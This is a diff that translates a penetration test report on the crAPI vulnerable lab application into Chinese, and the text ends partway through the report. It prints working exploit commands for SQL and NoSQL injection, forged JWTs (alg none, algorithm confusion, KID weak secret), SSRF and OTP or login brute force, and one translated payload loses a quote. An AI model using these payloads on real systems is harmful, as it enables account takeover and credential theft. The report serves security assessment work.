@@ -1,270 +1,270 @@
-# Security Assessment Report
+# 安全评估报告
 
-## Executive Summary
-- Target: Crapi
-- Assessment Date: September 2025
-- Scope: Authentication, XSS, SQL and Command Injection, SSRF, Authorization testing
+## 执行摘要
+- **目标:** Crapi
+- **评估日期:** 2025年9月
+- **范围:** 认证、XSS、SQL和命令注入、SSRF、授权测试
 
-## Summary by Vulnerability Type
+## 按漏洞类型汇总
 
-**Authentication Vulnerabilities:**
-Multiple critical authentication bypass vulnerabilities were successfully exploited. The application demonstrates complete authentication system failure with JWT algorithm confusion attacks allowing privilege escalation from user to admin roles, unsigned JWT token acceptance bypassing all cryptographic verification, and unlimited brute force capabilities against login and OTP validation endpoints. These vulnerabilities enable attackers to impersonate any user, including administrators, without requiring legitimate credentials.
+**认证漏洞:**
+成功利用了多个严重的认证绕过漏洞。应用程序展示了完全的认证系统失败，包括JWT算法混淆攻击允许从用户角色提升到管理员角色，接受无签名JWT令牌绕过所有加密验证，以及对登录和OTP验证端点的无限暴力攻击能力。这些漏洞使攻击者能够冒充任何用户，包括管理员，而无需合法凭证。
 
-**Authorization Vulnerabilities:**
-Critical authorization control failures were discovered and exploited across multiple endpoints. The application allows unauthenticated access to sensitive order data containing payment information, enables horizontal privilege escalation between user accounts for accessing private forum posts, and permits regular users to access mechanic-only functionality. Business logic bypasses allow unlimited store credit accumulation without proper shopping workflow validation.
+**授权漏洞:**
+在多个端点发现并利用了严重的授权控制失败。应用程序允许未经认证访问包含支付信息的敏感订单数据，启用用户账户之间的水平权限提升以访问私人论坛帖子，并允许普通用户访问仅限机械师的功能。业务逻辑绕过允许无限累积商店信用，无需适当的购物工作流程验证。
 
-**Cross-Site Scripting (XSS) Vulnerabilities:**
-No XSS vulnerabilities were found. The application code analysis identified potential XSS sinks in ReactMarkdown components and Django templates, but exploitation attempts were blocked by input validation and framework-level protections.
+**跨站脚本 (XSS) 漏洞:**
+未发现XSS漏洞。应用程序代码分析在ReactMarkdown组件和Django模板中识别出潜在的XSS接收器，但利用尝试被输入验证和框架级保护阻止。
 
-**SQL/Command Injection Vulnerabilities:**
-Critical injection vulnerabilities were successfully exploited in both SQL and NoSQL contexts. PostgreSQL injection in the coupon validation endpoint enabled complete database compromise with extraction of user credentials and system information. MongoDB injection allowed bypassing query filters to access arbitrary coupon data. Command injection vulnerabilities exist in video processing functionality but are protected by internal network restrictions.
+**SQL/命令注入漏洞:**
+在SQL和NoSQL上下文中成功利用了严重的注入漏洞。优惠券验证端点中的PostgreSQL注入启用了完整的数据库入侵，提取用户凭证和系统信息。MongoDB注入允许绕过查询过滤器以访问任意优惠券数据。视频处理功能中存在命令注入漏洞，但受内部网络限制保护。
 
-**Server-Side Request Forgery (SSRF) Vulnerabilities:**
-A critical SSRF vulnerability was successfully exploited through the contact mechanic endpoint, enabling complete internal network access with credential theft capabilities. The vulnerability includes a retry mechanism for persistent attacks and forwards authorization headers to external services. Additional SSRF vectors exist in JWT processing but are currently blocked by token validation logic.
+**服务器端请求伪造 (SSRF) 漏洞:**
+通过联系机械师端点成功利用了一个严重的SSRF漏洞，启用了具有凭证窃取能力的完整内部网络访问。该漏洞包括用于持久攻击的重试机制，并将授权标头转发到外部服务。JWT处理中存在额外的SSRF向量，但目前被令牌验证逻辑阻止。
 
-## Network Reconnaissance
+## 网络侦察
 
-**Open Ports and Exposed Services:**
-[REDACTED]
-**Security Misconfigurations:**
-[REDACTED]
+**开放端口和暴露服务:**
+[已编辑]
+**安全配置错误:**
+[已编辑]
 
-**Subdomain Discovery:**
-[REDACTED]
+**子域名发现:**
+[已编辑]
 
-# Injection Exploitation Evidence
+# 注入利用证据
 
-## Successfully Exploited Vulnerabilities
+## 成功利用的漏洞
 
-### INJ-VULN-03: PostgreSQL SQL Injection via Coupon Validation
+### INJ-VULN-03: 通过优惠券验证的PostgreSQL SQL注入
 
-**Summary:**
-- **Vulnerable location:** `/workshop/api/shop/apply_coupon` endpoint, `coupon_code` parameter
-- **Overview:** Complete SQL injection exploitation achieving database version disclosure, table enumeration, and sensitive data extraction via UNION-based queries
-- **Impact:** Full database compromise with extraction of user credentials and system information
-- **Severity:** Critical
+**摘要:**
+- **漏洞位置:** `/workshop/api/shop/apply_coupon` 端点，`coupon_code` 参数
+- **概述:** 完整的SQL注入利用，通过基于UNION的查询实现数据库版本披露、表枚举和敏感数据提取
+- **影响:** 完整的数据库入侵，提取用户凭证和系统信息
+- **严重性:** 严重
 
-**Prerequisites:**
-- Valid JWT authentication token
-- POST request with both `coupon_code` and `amount` parameters
+**先决条件:**
+- 有效的JWT认证令牌
+- 包含 `coupon_code` 和 `amount` 参数的POST请求
 
-**Exploitation Steps:**
+**利用步骤:**
 
-1. **Authenticate and obtain JWT token:**
+1. **认证并获取JWT令牌:**
 ```bash
 curl -k -X POST https://crapi.sandbox.local:8888/identity/api/auth/login \
   -H "Content-Type: application/json" \
   -d '{"email": "admin@example.com", "password": "Admin!123"}'
 ```
-Response: JWT token in the `token` field
+响应: `token` 字段中的JWT令牌
 
-2. **Confirm SQL injection vulnerability:**
+2. **确认SQL注入漏洞:**
 ```bash
 curl -k -X POST https://crapi.sandbox.local:8888/workshop/api/shop/apply_coupon \
   -H "Authorization: Bearer [JWT_TOKEN]" \
   -H "Content-Type: application/json" \
   -d '{"coupon_code": "'\'' OR 1=1--", "amount": 100}'
 ```
-Response: `{"message":"TESTCOUPON20 Coupon code is already claimed by you!! Please try with another coupon code"}`
+响应: `{"message":"TESTCOUPON20 Coupon code is already claimed by you!! Please try with another coupon code"}`
 
-3. **Extract database version information:**
+3. **提取数据库版本信息:**
 ```bash
 curl -k -X POST https://crapi.sandbox.local:8888/workshop/api/shop/apply_coupon \
   -H "Authorization: Bearer [JWT_TOKEN]" \
   -H "Content-Type: application/json" \
   -d '{"coupon_code": "'\'' AND 1=2 UNION SELECT version()--", "amount": 100}'
 ```
-Response: `{"message":"PostgreSQL 14.19 (Debian 14.19-1.pgdg13+1) on x86_64-pc-linux-gnu, compiled by gcc (Debian 14.2.0-19) 14.2.0, 64-bit Coupon code is already claimed by you!! Please try with another coupon code"}`
+响应: `{"message":"PostgreSQL 14.19 (Debian 14.19-1.pgdg13+1) on x86_64-pc-linux-gnu, compiled by gcc (Debian 14.2.0-19) 14.2.0, 64-bit Coupon code is already claimed by you!! Please try with another coupon code"}`
 
-4. **Extract current database user:**
+4. **提取当前数据库用户:**
 ```bash
 curl -k -X POST https://crapi.sandbox.local:8888/workshop/api/shop/apply_coupon \
   -H "Authorization: Bearer [JWT_TOKEN]" \
   -H "Content-Type: application/json" \
   -d '{"coupon_code": "'\'' AND 1=2 UNION SELECT user--", "amount": 100}'
 ```
-Response: `{"message":"admin Coupon code is already claimed by you!! Please try with another coupon code"}`
+响应: `{"message":"admin Coupon code is already claimed by you!! Please try with another coupon code"}`
 
-5. **Extract database name:**
+5. **提取数据库名称:**
 ```bash
 curl -k -X POST https://crapi.sandbox.local:8888/workshop/api/shop/apply_coupon \
   -H "Authorization: Bearer [JWT_TOKEN]" \
   -H "Content-Type: application/json" \
   -d '{"coupon_code": "'\'' AND 1=2 UNION SELECT current_database()--", "amount": 100}'
 ```
-Response: `{"message":"crapi Coupon code is already claimed by you!! Please try with another coupon code"}`
+响应: `{"message":"crapi Coupon code is already claimed by you!! Please try with another coupon code"}`
 
-6. **Enumerate all table names:**
+6. **枚举所有表名:**
 ```bash
 curl -k -X POST https://crapi.sandbox.local:8888/workshop/api/shop/apply_coupon \
   -H "Authorization: Bearer [JWT_TOKEN]" \
   -H "Content-Type: application/json" \
   -d '{"coupon_code": "'\'' AND 1=2 UNION SELECT string_agg(table_name, '\'','\'') FROM information_schema.tables WHERE table_schema='\''public'\''--", "amount": 100}'
 ```
-Response: `{"message":"otp_token,profile_video,user_details,vehicle_model,vehicle_details,vehicle_location,vehicle_company,user_login,otp,mechanic,django_migrations,django_content_type,auth_permission,auth_group,auth_group_permissions,auth_user_groups,auth_user_user_permissions,auth_user,django_admin_log,service_request,product,applied_coupon,order,health_check_db_testmodel,django_session Coupon code is already claimed by you!! Please try with another coupon code"}`
+响应: `{"message":"otp_token,profile_video,user_details,vehicle_model,vehicle_details,vehicle_location,vehicle_company,user_login,otp,mechanic,django_migrations,django_content_type,auth_permission,auth_group,auth_group_permissions,auth_user_groups,auth_user_user_permissions,auth_user,django_admin_log,service_request,product,applied_coupon,order,health_check_db_testmodel,django_session Coupon code is already claimed by you!! Please try with another coupon code"}`
 
-7. **Extract sensitive user credentials:**
+7. **提取敏感用户凭证:**
 ```bash
 curl -k -X POST https://crapi.sandbox.local:8888/workshop/api/shop/apply_coupon \
   -H "Authorization: Bearer [JWT_TOKEN]" \
   -H "Content-Type: application/json" \
-  -d '{"coupon_code": "'\'' AND 1=2 UNION SELECT email||'\'':'\''||password FROM user_login LIMIT 5--", "amount": 100}'
+  -d '{"coupon_code": "'\'' AND 1=2 UNION SELECT email||'\'':''||password FROM user_login LIMIT 5--", "amount": 100}'
 ```
-Response: `{"message":"test6@test.com:$2a$10$TwbchLEy4653ENobgxRKjemiHlnQE98CPncJYVhFeIfCLeicefAPG Coupon code is already claimed by you!! Please try with another coupon code"}`
+响应: `{"message":"test6@test.com:$2a$10$TwbchLEy4653ENobgxRKjemiHlnQE98CPncJYVhFeIfCLeicefAPG Coupon code is already claimed by you!! Please try with another coupon code"}`
 
-**Proof of Impact:**
-- **Database Version Extracted:** PostgreSQL 14.19 (Debian 14.19-1.pgdg13+1)
-- **Database User:** admin (high privileges)
-- **Database Name:** crapi
-- **Complete Table Enumeration:** 25 tables including sensitive user data
-- **Password Hash Extracted:** test6@test.com:$2a$10$TwbchLEy4653ENobgxRKjemiHlnQE98CPncJYVhFeIfCLeicefAPG (BCrypt hash)
+**影响证明:**
+- **提取的数据库版本:** PostgreSQL 14.19 (Debian 14.19-1.pgdg13+1)
+- **数据库用户:** admin (高权限)
+- **数据库名称:** crapi
+- **完整表枚举:** 25个表，包括敏感用户数据
+- **提取的密码哈希:** test6@test.com:$2a$10$TwbchLEy4653ENobgxRKjemiHlnQE98CPncJYVhFeIfCLeicefAPG (BCrypt哈希)
 
-### INJ-VULN-04: MongoDB NoSQL Injection via Community Coupon Validation
+### INJ-VULN-04: 通过社区优惠券验证的MongoDB NoSQL注入
 
-**Summary:**
-- **Vulnerable location:** `/community/api/v2/coupon/validate-coupon` endpoint
-- **Overview:** MongoDB operator injection allowing complete query manipulation and data extraction from NoSQL database
-- **Impact:** Unauthorized access to MongoDB coupon collection with ability to extract arbitrary documents
-- **Severity:** High
+**摘要:**
+- **漏洞位置:** `/community/api/v2/coupon/validate-coupon` 端点
+- **概述:** MongoDB操作符注入允许从NoSQL数据库进行完整的查询操作和数据提取
+- **影响:** 未授权访问MongoDB优惠券集合，能够提取任意文档
+- **严重性:** 高
 
-**Prerequisites:**
-- Valid JWT authentication token
+**先决条件:**
+- 有效的JWT认证令牌
 
-**Exploitation Steps:**
+**利用步骤:**
 
-1. **Authenticate and obtain JWT token:**
+1. **认证并获取JWT令牌:**
 ```bash
 curl -k -X POST https://crapi.sandbox.local:8888/identity/api/auth/login \
   -H "Content-Type: application/json" \
   -d '{"email": "admin@example.com", "password": "Admin!123"}'
 ```
 
-2. **Test basic endpoint functionality:**
+2. **测试基本端点功能:**
 ```bash
 curl -k -X POST https://crapi.sandbox.local:8888/community/api/v2/coupon/validate-coupon \
   -H "Authorization: Bearer [JWT_TOKEN]" \
   -H "Content-Type: application/json" \
   -d '{"coupon_code": "test"}'
 ```
-Response: `{}` (empty object for non-existent coupon)
+响应: `{}` (不存在的优惠券的空对象)
 
-3. **Exploit with $ne operator to extract data:**
+3. **使用$ne操作符进行利用以提取数据:**
 ```bash
 curl -k -X POST https://crapi.sandbox.local:8888/community/api/v2/coupon/validate-coupon \
   -H "Authorization: Bearer [JWT_TOKEN]" \
   -H "Content-Type: application/json" \
   -d '{"coupon_code": {"$ne": null}}'
 ```
-Response: `{"coupon_code":"TRAC075","amount":"75","CreatedAt":"2025-09-23T18:00:24.201Z"}`
+响应: `{"coupon_code":"TRAC075","amount":"75","CreatedAt":"2025-09-23T18:00:24.201Z"}`
 
-4. **Verify with regex operator:**
+4. **使用正则表达式操作符验证:**
 ```bash
 curl -k -X POST https://crapi.sandbox.local:8888/community/api/v2/coupon/validate-coupon \
   -H "Authorization: Bearer [JWT_TOKEN]" \
   -H "Content-Type: application/json" \
   -d '{"coupon_code": {"$regex": "^."}}'
 ```
-Response: `{"coupon_code":"TRAC075","amount":"75","CreatedAt":"2025-09-23T18:00:24.201Z"}`
+响应: `{"coupon_code":"TRAC075","amount":"75","CreatedAt":"2025-09-23T18:00:24.201Z"}`
 
-5. **Confirm with greater-than operator:**
+5. **使用大于操作符确认:**
 ```bash
 curl -k -X POST https://crapi.sandbox.local:8888/community/api/v2/coupon/validate-coupon \
   -H "Authorization: Bearer [JWT_TOKEN]" \
   -H "Content-Type: application/json" \
   -d '{"coupon_code": {"$gt": ""}}'
 ```
-Response: `{"coupon_code":"TRAC075","amount":"75","CreatedAt":"2025-09-23T18:00:24.201Z"}`
+响应: `{"coupon_code":"TRAC075","amount":"75","CreatedAt":"2025-09-23T18:00:24.201Z"}`
 
-**Proof of Impact:**
-- **Complete MongoDB Query Manipulation:** Successfully bypassed all query filters using MongoDB operators
-- **Sensitive Data Extracted:** Coupon code TRAC075 with value $75 and creation timestamp
-- **Multiple Injection Vectors Confirmed:** $ne, $regex, and $gt operators all successful
-- **Business Logic Bypass:** Able to access arbitrary coupons without knowing valid codes
+**影响证明:**
+- **完整的MongoDB查询操作:** 成功使用MongoDB操作符绕过所有查询过滤器
+- **提取的敏感数据:** 优惠券代码TRAC075，价值$75和创建时间戳
+- **确认的多个注入向量:** $ne、$regex和$gt操作符均成功
+- **业务逻辑绕过:** 能够访问任意优惠券而不知道有效代码
 
-# Authentication Exploitation Evidence
+# 认证利用证据
 
-## Successfully Exploited Vulnerabilities
+## 成功利用的漏洞
 
-### AUTH-VULN-04: JWT Algorithm Confusion Attack (RS256 to HS256)
+### AUTH-VULN-04: JWT算法混淆攻击 (RS256 到 HS256)
 
-**Summary:**
-- **Vulnerable location:** JWT validation in `services/identity/src/main/java/com/crapi/config/JwtProvider.java`
-- **Overview:** Successfully exploited JWT algorithm confusion vulnerability by changing algorithm from RS256 to HS256 and using RSA public key as HMAC secret
-- **Impact:** Complete authentication bypass with admin privilege escalation
-- **Severity:** Critical
+**摘要:**
+- **漏洞位置:** `services/identity/src/main/java/com/crapi/config/JwtProvider.java` 中的JWT验证
+- **概述:** 通过将算法从RS256更改为HS256并使用RSA公钥作为HMAC密钥，成功利用了JWT算法混淆漏洞
+- **影响:** 完整的认证绕过，具有管理员权限提升
+- **严重性:** 严重
 
-**Prerequisites:**
-- Access to RSA public key from `/.well-known/jwks.json`
-- Knowledge of JWT token structure
+**先决条件:**
+- 从 `/.well-known/jwks.json` 访问RSA公钥
+- 了解JWT令牌结构
 
-**Exploitation Steps:**
+**利用步骤:**
 
-1. Extract RSA public key from JWKS endpoint:
+1. 从JWKS端点提取RSA公钥:
 ```bash
 curl -k "https://crapi.sandbox.local:8888/.well-known/jwks.json"
 ```
 
-2. Obtain legitimate JWT token by logging in with `test@example.com / Test!123`
+2. 使用 `test@example.com / Test!123` 登录获取合法JWT令牌
 
-3. Create forged JWT token using algorithm confusion:
-   - Change header algorithm from `"alg": "RS256"` to `"alg": "HS256"`
-   - Modify payload role from `"role": "user"` to `"role": "admin"`
-   - Change subject from `test@example.com` to `admin@example.com`
-   - Sign using HMAC-SHA256 with RSA public key as secret
+3. 使用算法混淆创建伪造的JWT令牌:
+   - 将头部算法从 `"alg": "RS256"` 更改为 `"alg": "HS256"`
+   - 将载荷角色从 `"role": "user"` 修改为 `"role": "admin"`
+   - 将主题从 `test@example.com` 更改为 `admin@example.com`
+   - 使用HMAC-SHA256和RSA公钥作为密钥进行签名
 
-4. Test forged token against dashboard endpoint:
+4. 测试伪造令牌对仪表板端点:
 ```bash
 curl -k -H "Authorization: Bearer [FORGED_TOKEN]" "https://crapi.sandbox.local:8888/identity/api/v2/user/dashboard"
 ```
 
-**Proof of Impact:**
-- Original token: User access to `test@example.com` account
-- Forged token: Admin access to `admin@example.com` account with elevated privileges
-- Response included sensitive admin dashboard data confirming privilege escalation
+**影响证明:**
+- 原始令牌: 对 `test@example.com` 账户的用户访问
+- 伪造令牌: 对 `admin@example.com` 账户的管理员访问，具有提升的权限
+- 响应包含敏感的管理员仪表板数据，确认权限提升
 
-**Notes:**
-Python script `/source/jwt_algorithm_confusion_attack.py` demonstrates complete attack chain with 100% success rate.
+**注意事项:**
+Python脚本 `/source/jwt_algorithm_confusion_attack.py` 演示了完整的攻击链，成功率100%。
 
-### AUTH-VULN-05: JWT 'None' Algorithm Authentication Bypass
+### AUTH-VULN-05: JWT 'None' 算法认证绕过
 
-**Summary:**
-- **Vulnerable location:** JWT validation accepts unsigned tokens with `"alg": "none"`
-- **Overview:** Complete authentication bypass using unsigned JWT tokens
-- **Impact:** Full access to admin account without any cryptographic verification
-- **Severity:** Critical
+**摘要:**
+- **漏洞位置:** JWT验证接受带有 `"alg": "none"` 的无签名令牌
+- **概述:** 使用无签名JWT令牌的完整认证绕过
+- **影响:** 无需任何加密验证即可完全访问管理员账户
+- **严重性:** 严重
 
-**Prerequisites:** None
+**先决条件:** 无
 
-**Exploitation Steps:**
+**利用步骤:**
 
-1. Create unsigned JWT token with admin privileges:
-   - Header: `{"alg": "none"}`
-   - Payload: `{"sub": "admin@example.com", "iat": 1758655244, "exp": 1759260044, "role": "admin"}`
-   - Signature: Empty (unsigned token format: `header.payload.`)
+1. 创建具有管理员权限的无签名JWT令牌:
+   - 头部: `{"alg": "none"}`
+   - 载荷: `{"sub": "admin@example.com", "iat": 1758655244, "exp": 1759260044, "role": "admin"}`
+   - 签名: 空 (无签名令牌格式: `header.payload.`)
 
-2. Test unsigned token:
+2. 测试无签名令牌:
 ```bash
 curl -k -H "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbkBleGFtcGxlLmNvbSIsImlhdCI6MTc1ODY1NTI0NCwiZXhwIjoxNzU5MjYwMDQ0LCJyb2xlIjoiYWRtaW4ifQ." "https://crapi.sandbox.local:8888/identity/api/v2/user/dashboard"
 ```
 
-**Proof of Impact:**
-- HTTP 200 response with full admin dashboard access
-- Retrieved sensitive admin account information including credentials
-- Complete bypass of all authentication mechanisms
+**影响证明:**
+- HTTP 200响应，具有完整的管理员仪表板访问权限
+- 检索到敏感的管理员账户信息，包括凭证
+- 完全绕过所有认证机制
 
-### AUTH-VULN-06: JWT JKU Header SSRF Exploitation
+### AUTH-VULN-06: JWT JKU 头部 SSRF 利用
 
-**Summary:**
-- **Vulnerable location:** JKU header processing in JWT validation
-- **Overview:** Server-Side Request Forgery through JWT Key URL manipulation
-- **Impact:** Internal network reconnaissance and potential access to cloud metadata
-- **Severity:** High
+**摘要:**
+- **漏洞位置:** JWT验证中的JKU头部处理
+- **概述:** 通过JWT密钥URL操作的服务器端请求伪造
+- **影响:** 内部网络侦察和潜在的云元数据访问
+- **严重性:** 高
 
-**Prerequisites:** Ability to craft JWT tokens with JKU headers
+**先决条件:** 能够使用JKU头部制作JWT令牌
 
-**Exploitation Steps:**
+**利用步骤:**
 
-1. Create JWT with malicious JKU header pointing to internal resources:
+1. 创建带有指向内部资源的恶意JKU头部的JWT:
 ```json
 {
   "alg": "RS256",
@@ -273,30 +273,30 @@ curl -k -H "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbkBleGFtcG
 }
 ```
 
-2. Test internal network access:
-   - `http://192.168.1.1/admin` (10.0s timeout - confirms internal network access)
-   - `http://10.0.0.1/status` (10.3s timeout - confirms internal routing)
-   - `http://172.16.0.1/health` (10.3s timeout - confirms private IP access)
+2. 测试内部网络访问:
+   - `http://192.168.1.1/admin` (10.0s超时 - 确认内部网络访问)
+   - `http://10.0.0.1/status` (10.3s超时 - 确认内部路由)
+   - `http://172.16.0.1/health` (10.3s超时 - 确认私有IP访问)
 
-**Proof of Impact:**
-- Confirmed SSRF capability through timeout analysis
-- Server makes HTTP requests to attacker-controlled URLs
-- Internal network ranges (RFC 1918) are accessible
-- Potential for cloud metadata service access
+**影响证明:**
+- 通过超时分析确认SSRF能力
+- 服务器向攻击者控制的URL发出HTTP请求
+- 内部网络范围 (RFC 1918) 可访问
+- 潜在的云元数据服务访问
 
-### AUTH-VULN-07: JWT KID Header Injection Exploitation 
+### AUTH-VULN-07: JWT KID 头部注入利用
 
-**Summary:**
-- **Vulnerable location:** KID header processing triggers weak secret usage
-- **Overview:** Path traversal in KID header forces application to use weak HMAC secret
-- **Impact:** Complete authentication bypass through weak secret exploitation
-- **Severity:** Critical
+**摘要:**
+- **漏洞位置:** KID头部处理触发弱密钥使用
+- **概述:** KID头部中的路径遍历强制应用程序使用弱HMAC密钥
+- **影响:** 通过弱密钥利用实现完整的认证绕过
+- **严重性:** 严重
 
-**Prerequisites:** None
+**先决条件:** 无
 
-**Exploitation Steps:**
+**利用步骤:**
 
-1. Create JWT token with KID header set to `/dev/null`:
+1. 创建KID头部设置为 `/dev/null` 的JWT令牌:
 ```json
 {
   "alg": "HS256",
@@ -305,9 +305,9 @@ curl -k -H "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbkBleGFtcG
 }
 ```
 
-2. Sign token with weak secret `AA==` (triggered by `/dev/null` KID):
+2. 使用弱密钥 `AA==` 签名令牌 (由 `/dev/null` KID触发):
 ```bash
-# Python implementation
+# Python实现
 import base64
 import hmac
 import hashlib
@@ -315,91 +315,91 @@ weak_secret = base64.b64decode("AA==")
 signature = hmac.new(weak_secret, token_data.encode(), hashlib.sha256).digest()
 ```
 
-3. Test forged token with admin privileges:
+3. 测试具有管理员权限的伪造令牌:
 ```bash
 curl -k -H "Authorization: Bearer [KID_FORGED_TOKEN]" "https://crapi.sandbox.local:8888/identity/api/v2/user/dashboard"
 ```
 
-**Proof of Impact:**
-- 100% success rate across 12 different KID injection payloads
-- Successful privilege escalation to admin role
-- Access to sensitive admin dashboard data
-- Complete authentication bypass through weak secret exploitation
+**影响证明:**
+- 12个不同的KID注入有效载荷的100%成功率
+- 成功提升权限到管理员角色
+- 访问敏感的管理员仪表板数据
+- 通过弱密钥利用实现完整的认证绕过
 
-### AUTH-VULN-03: OTP Brute Force Attack on v2 Endpoint
+### AUTH-VULN-03: v2端点上的OTP暴力攻击
 
-**Summary:**
-- **Vulnerable location:** `POST /identity/api/auth/v2/check-otp`
-- **Overview:** Unlimited OTP brute force attempts on legacy v2 endpoint
-- **Impact:** Complete account takeover through 4-digit OTP exhaustion
-- **Severity:** Critical
+**摘要:**
+- **漏洞位置:** `POST /identity/api/auth/v2/check-otp`
+- **概述:** 旧版v2端点上的无限OTP暴力尝试
+- **影响:** 通过4位OTP耗尽实现完整的账户接管
+- **严重性:** 严重
 
-**Prerequisites:**
-- Trigger OTP generation via password reset for target user
+**先决条件:**
+- 通过目标用户的密码重置触发OTP生成
 
-**Exploitation Steps:**
+**利用步骤:**
 
-1. Initiate password reset for target account:
+1. 为目标账户启动密码重置:
 ```bash
 curl -k -X POST "https://crapi.sandbox.local:8888/identity/api/auth/forget-password" -H "Content-Type: application/json" -d '{"email": "test@example.com"}'
 ```
 
-2. Systematically test all 4-digit OTP codes on vulnerable v2 endpoint:
+2. 在易受攻击的v2端点上系统测试所有4位OTP代码:
 ```bash
-# Test range 0000-9999
+# 测试范围 0000-9999
 for otp in range(10000):
     curl -k -X POST "https://crapi.sandbox.local:8888/identity/api/auth/v2/check-otp" -H "Content-Type: application/json" -d '{"otp": "' + str(otp).zfill(4) + '", "password": "NewPassword123!", "email": "test@example.com"}'
 ```
 
-**Proof of Impact:**
-- Successfully tested 150+ consecutive OTP attempts without rate limiting
-- Demonstrated feasibility of testing all 10,000 possible codes
-- Estimated attack time: 66.7 minutes for complete exhaustion
-- v3 endpoint properly blocks after 10 attempts (security comparison confirmed)
+**影响证明:**
+- 成功测试了150+连续OTP尝试，无速率限制
+- 演示了测试所有10,000个可能代码的可行性
+- 估计攻击时间: 完全耗尽需要66.7分钟
+- v3端点在10次尝试后正确阻止 (安全比较已确认)
 
-### AUTH-VULN-01: Unlimited Brute Force Attack on Login Endpoint
+### AUTH-VULN-01: 登录端点上的无限暴力攻击
 
-**Summary:**
-- **Vulnerable location:** `POST /identity/api/auth/login`
-- **Overview:** No rate limiting, account lockout, or CAPTCHA protection
-- **Impact:** Unlimited credential brute force attacks against user accounts
-- **Severity:** Critical
+**摘要:**
+- **漏洞位置:** `POST /identity/api/auth/login`
+- **概述:** 无速率限制、账户锁定或CAPTCHA保护
+- **影响:** 针对用户账户的无限凭证暴力攻击
+- **严重性:** 严重
 
-**Prerequisites:**
-- Valid email address (obtainable through user enumeration)
+**先决条件:**
+- 有效的电子邮件地址 (可通过用户枚举获得)
 
-**Exploitation Steps:**
+**利用步骤:**
 
-1. Target known valid account `test@example.com` with common passwords:
+1. 使用常见密码针对已知有效账户 `test@example.com`:
 ```bash
 curl -k -X POST "https://crapi.sandbox.local:8888/identity/api/auth/login" -H "Content-Type: application/json" -d '{"email": "test@example.com", "password": "password"}'
 ```
 
-2. Perform automated brute force with password list:
-   - "password", "123456", "admin", "test", "password123", "qwerty", etc.
+2. 使用密码列表执行自动暴力攻击:
+   - "password", "123456", "admin", "test", "password123", "qwerty", 等
 
-3. Execute parallel attacks to test concurrent handling
+3. 执行并行攻击以测试并发处理
 
-**Proof of Impact:**
-- Successfully performed 55+ consecutive failed login attempts
-- No account lockout mechanisms triggered
-- No rate limiting or IP-based blocking detected
-- No CAPTCHA or additional verification required
-- Consistent response times indicating no throttling
+**影响证明:**
+- 成功执行了55+连续失败的登录尝试
+- 未触发账户锁定机制
+- 未检测到速率限制或基于IP的阻止
+- 不需要CAPTCHA或额外验证
+- 一致的响应时间表明没有节流
 
-### AUTH-VULN-02: Unlimited Account Creation Exploitation
+### AUTH-VULN-02: 无限账户创建利用
 
-**Summary:**
-- **Vulnerable location:** `POST /identity/api/auth/signup`
-- **Overview:** No rate limiting on account registration enables resource exhaustion
-- **Impact:** Database bloat, resource exhaustion, and service abuse
-- **Severity:** High
+**摘要:**
+- **漏洞位置:** `POST /identity/api/auth/signup`
+- **概述:** 账户注册无速率限制，启用资源耗尽
+- **影响:** 数据库膨胀、资源耗尽和服务滥用
+- **严重性:** 高
 
-**Prerequisites:** None
+**先决条件:** 无
 
-**Exploitation Steps:**
+**利用步骤:**
 
-1. Create automated account generation script:
+1. 创建自动账户生成脚本:
 ```python
 for i in range(50):
     data = {
@@ -411,108 +411,108 @@ for i in range(50):
     response = requests.post(signup_url, json=data)
 ```
 
-2. Execute concurrent account creation across multiple threads
+2. 跨多个线程执行并发账户创建
 
-**Proof of Impact:**
-- Successfully created 49 out of 50 accounts (98% success rate)
-- No rate limiting, CAPTCHA, or IP-based restrictions
-- Demonstrated resource exhaustion potential
-- Average response time: 1,820ms (no throttling detected)
+**影响证明:**
+- 成功创建了50个账户中的49个 (98%成功率)
+- 无速率限制、CAPTCHA或基于IP的限制
+- 演示了资源耗尽潜力
+- 平均响应时间: 1,820ms (未检测到节流)
 
-### AUTH-VULN-08: User Enumeration via Login Error Messages
+### AUTH-VULN-08: 通过登录错误消息的用户枚举
 
-**Summary:**
-- **Vulnerable location:** `POST /identity/api/auth/login` error responses
-- **Overview:** Different error messages reveal account existence
-- **Impact:** Privacy violation and reconnaissance for targeted attacks
-- **Severity:** Medium
+**摘要:**
+- **漏洞位置:** `POST /identity/api/auth/login` 错误响应
+- **概述:** 不同的错误消息揭示账户存在
+- **影响:** 隐私侵犯和针对性攻击的侦察
+- **严重性:** 中等
 
-**Prerequisites:** None
+**先决条件:** 无
 
-**Exploitation Steps:**
+**利用步骤:**
 
-1. Test non-existent email:
+1. 测试不存在的电子邮件:
 ```bash
 curl -k -X POST "https://crapi.sandbox.local:8888/identity/api/auth/login" -H "Content-Type: application/json" -d '{"email": "nonexistent@test.com", "password": "anything"}'
 ```
-Response: `"Given Email is not registered!"`
+响应: `"Given Email is not registered!"`
 
-2. Test existing email with wrong password:
+2. 测试现有电子邮件，使用错误密码:
 ```bash
 curl -k -X POST "https://crapi.sandbox.local:8888/identity/api/auth/login" -H "Content-Type: application/json" -d '{"email": "test@example.com", "password": "wrongpassword"}'
 ```
-Response: `"Invalid Credentials"`
+响应: `"Invalid Credentials"`
 
-**Proof of Impact:**
-- Clear distinction between "user exists" vs "user doesn't exist"
-- Confirmed valid accounts: `test@example.com`, `admin@example.com`
-- 18 emails tested with 100% enumeration accuracy
+**影响证明:**
+- "用户存在" 与 "用户不存在" 之间的明确区别
+- 确认的有效账户: `test@example.com`, `admin@example.com`
+- 测试了18个电子邮件，枚举准确率100%
 
-### AUTH-VULN-09: User Enumeration via Signup Error Messages
+### AUTH-VULN-09: 通过注册错误消息的用户枚举
 
-**Summary:**
-- **Vulnerable location:** `POST /identity/api/auth/signup` error responses  
-- **Overview:** Registration attempts reveal existing emails and phone numbers
-- **Impact:** Privacy violation and account enumeration
-- **Severity:** Medium
+**摘要:**
+- **漏洞位置:** `POST /identity/api/auth/signup` 错误响应
+- **概述:** 注册尝试揭示现有电子邮件和电话号码
+- **影响:** 隐私侵犯和账户枚举
+- **严重性:** 中等
 
-**Prerequisites:** None
+**先决条件:** 无
 
-**Exploitation Steps:**
+**利用步骤:**
 
-1. Test signup with existing phone number:
+1. 测试使用现有电话号码注册:
 ```bash
